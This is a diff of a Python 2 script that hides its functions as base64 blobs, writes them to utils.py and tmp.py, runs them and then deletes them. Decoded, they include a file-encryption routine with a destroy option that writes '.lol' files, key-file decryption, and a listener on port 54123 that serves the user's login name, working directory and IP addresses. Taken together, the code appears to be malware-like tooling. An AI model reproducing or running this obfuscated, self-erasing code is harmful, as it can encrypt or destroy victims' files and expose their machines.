@@ -12,12 +12,9 @@ def create_utils():
 	body = base64.b64decode('CkJTWj0xNjtQQUQ9J3snCnBhZD1sYW1iZGEgczogcyArIChCU1ogLSBsZW4ocykgJSBCU1opKlBBRAo=')
 	enc = base64.b64decode('RW5jb2RlQUVTID0gbGFtYmRhIGMsIHM6IGJhc2U2NC5iNjRlbmNvZGUoYy5lbmNyeXB0KHBhZChzKSkpCg==')
 	dec = base64.b64decode('RGVjb2RlQUVTID0gbGFtYmRhIGMsIGU6IGMuZGVjcnlwdChiYXNlNjQuYjY0ZGVjb2RlKGUpKS5yc3RyaXAoUEFEKQo=')
-	srv = base64.b64decode('CmRlZiBzdGFydF9saXN0ZW5lcihwKToKCXRyeToKCQlzPXNvY2tldC5zb2NrZXQoc29ja2V0'\
-		  'LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuYmluZCgoIjAuMC4wLjAiLHApKQo'\
-		  'JZXhjZXB0IHNvY2tldC5lcnJvcjoKCQlyZXR1cm4gW10KCXJldHVybiBzCg==')
-	rcv = base64.b64decode('CmRlZiBjcmVhdGVfc29ja2V0KCk6CglzPVtdCgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KHN'\
-		  'vY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKCWV4Y2VwdCBzb2NrZXQuZ'\
-		  'XJyb3I6CgkJcGFzcwoJcmV0dXJuIHMKCg==')
+	rcv = base64.b64decode('ZGVmIHN0YXJ0X2xpc3RlbmVyKHBvcnQpOgoJdHJ5OgoJCXM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2Nr'\
+			'ZXQuU09DS19TVFJFQU0pCgkJcy5iaW5kKCgnMC4wLjAuMCcsNTQxMjMpKQoJCXMubGlzdGVuKDUpCglleGNlcHQgc29ja2V0LmVycm9yOgo'
+			'JCXJldHVybiBbXQoJcmV0dXJuIHMK')
 	hide = base64.b64decode('CmRlZiBmZW5jcnlwdChmbmFtZSxkZXN0cm95KToKCWlmIG5vdCBvcy5wYXRoLmlzZmlsZS'\
 		   'hmbmFtZSk6CgkJZXhpdCgpCgllZmlsZT1mbmFtZS5zcGxpdCgiLyIpWy0xXS5zcGxpdCgi'\
 		   'LiIpWzBdKyIubG9sIgoJY29udGVudD1vcGVuKGZuYW1lLCJyYiIpLnJlYWQoKQoJaz1nZX'\
@@ -28,7 +25,7 @@ def create_utils():
 	see = base64.b64decode('ZGVmIGZkZWNyeXB0KGZuYW1lKToKCWVuY2Q9b3BlbihmbmFtZSwicmIiKS5yZWFkKCkKCWtm'\
 		  'PWZuYW1lLnNwbGl0KCIuIilbMF0rIi5rZXkiCglrPWJhc2U2NC5iNjRkZWNvZGUob3Blbihr'\
 		  'ZiwicmIiKS5yZWFkKCkpCglyZXR1cm4gRGVjb2RlQUVTKEFFUy5uZXcoayksZW5jZCkKCg==')
-	content = header+body+enc+dec+srv+rcv+hide+see
+	content = header+body+enc+dec+'\n'+rcv+hide+see
 	open(os.getcwd()+'/utils.py', 'wb').write(content)
 
 
@@ -55,20 +52,21 @@ def main():
 		print 'External IP:\t%s' % ext_ip
 	
 		# Start a Simple Listening Webserver?
-		bcmd = 'aW1wb3J0IHNvY2tldDsgc2VydmluZyA9IFRydWUKcyA9IHV0aWxzLnN0YXJ0X2xpc3RlbmVyKDU0MTIzKQpoID0'\
-			   'IjxodG1sPlxuPHRpdGxlPiVzPC90aXRsZT5cbjxib2R5PjxoMT4lczwvaDE+IiAlIChvcy5nZXRsb2dpbigpLHB'\
-			   '3ZCkKaDIgPSAiXG48aDE+JXM8L2gxPlxuPGgxPiVzPC9oMT5cbiIgJSAoaW50X2lwLCBleHRfaXApCmVuZCA9IC'\
-			   'JcbjwvYm9keT5cbjwvaHRtbD4iCnBhZ2U9aCtoMitlbmQKdHJ5OgoJd2hpbGUgc2VydmluZzoKCQkJCWNsaWVud'\
-			   'CwgY2FkZHIgPSBzLmFjY2VwdCgpCgkJY2xpZW5kLnNlbmQocGFnZSkKCQljbGllbnQuY2xvc2UoKQpleGNlcHQg'\
-			   'S2V5Ym9hcmRJbnRlcnJ1cHQ6CglzZXJ2aW5nPUZhbHNlCnMuY2xvc2UoKQo='
+		bcmd = 'aW1wb3J0IG9zLHNvY2tldCx1dGlscyxtb2R1bGU7IHNlcnZpbmcgPSBUcnVlCnMgPSB1dGlscy5zdGFydF9sa'\
+		'XN0ZW5lcig1NDEyMykKaCA9ICI8aHRtbD5cbjx0aXRsZT4lczwvdGl0bGU+XG48Ym9keT48aDE+JXM8L2gxPiIgJSAob'\
+		'3MuZ2V0bG9naW4oKSxvcy5nZXRjd2QoKSkKaDIgPSAiXG48aDE+JXM8L2gxPlxuPGgxPiVzPC9oMT5cbiIgJSAobW9kd'\
+		'WxlLmdldF9pbnRlcm5hbF9hZGRyKCksIG1vZHVsZS5nZXRfZXh0X2lwKCkpCmVuZCA9ICJcbjwvYm9keT5cbjwvaHRtb'\
+		'D4iCnBhZ2U9aCtoMitlbmQKdHJ5OgoJd2hpbGUgc2VydmluZzoKCQljbGllbnQsIGNhZGRyID0gcy5hY2NlcHQoKQoJC'\
+		'WNsaWVuZC5zZW5kKHBhZ2UpCgkJY2xpZW50LmNsb3NlKCkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJc2VydmluZ'\
+		'z1GYWxzZQpzLmNsb3NlKCkK'
+		
 		open('tmp.py','wb').write(base64.b64decode(bcmd))
 		os.system('python tmp.py')
-		os.remove('tmp.py')
 	if module.dos:
 		print 'Windows System'
 	
 	# cleanup 
-	cleanup = ['module.py', 'utils.py', 'utils.pyc', 'module.pyc']
+	cleanup = ['module.py', 'utils.py', 'utils.pyc', 'module.pyc', 'tmp.py']
 	for fobj in cleanup:
 		os.remove(fobj)
 
